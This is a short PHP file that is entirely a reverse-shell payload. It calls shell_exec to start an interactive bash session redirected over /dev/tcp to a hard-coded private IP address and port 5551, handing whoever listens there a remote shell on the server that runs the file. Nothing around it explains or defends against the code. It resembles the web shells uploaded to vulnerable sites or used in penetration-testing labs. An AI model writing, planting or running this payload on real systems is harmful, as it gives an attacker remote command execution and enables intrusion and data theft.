<?php
$ip = '10.21.166.215';  
$port = 5551;  
shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'");
?>
